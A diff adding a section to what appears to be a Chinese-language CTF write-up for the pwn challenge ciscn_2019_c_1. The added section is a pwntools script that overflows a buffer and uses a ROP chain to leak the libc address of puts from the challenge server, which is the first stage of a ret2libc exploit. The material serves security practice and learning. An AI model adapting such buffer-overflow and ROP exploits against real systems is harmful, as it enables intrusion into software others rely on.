@@ -86,3 +86,30 @@
 <img width="798" height="458" alt="image" src="https://github.com/user-attachments/assets/9b793a86-4c25-42f9-8b3a-06f41e381751" />
 
 构造第一次payload
+
+```python
+from pwn import *
+r=remote("4c9dc9ac.tcp-ctf2.dasctf.com", 9999, ssl=True)
+elf=ELF("./ciscn_2019_c_1")
+
+pop_rdi_addr=0x400c83
+put_got=elf.got['puts']
+put_plt=elf.plt['puts']
+encrypt_addr=0x4009A0
+
+r.sendlineafter("Input your choice!",str(1))
+
+payload=b"a"*88+p64(pop_rdi_addr)+p64(put_got)+p64(put_plt)+p64(encrypt_addr)
+r.sendline(payload)
+r.recvline()
+r.recvline()
+r.recvline()
+r.recvline()
+puts_addr=u64(r.recvuntil('\n')[:-1].ljust(8,b'\x00'))
+print(hex(puts_addr))
+
+r.interactive()
+```
+<img width="797" height="88" alt="image" src="https://github.com/user-attachments/assets/b2438e48-54b3-4043-96c0-9e3ccbb2c1f9" />
+
+
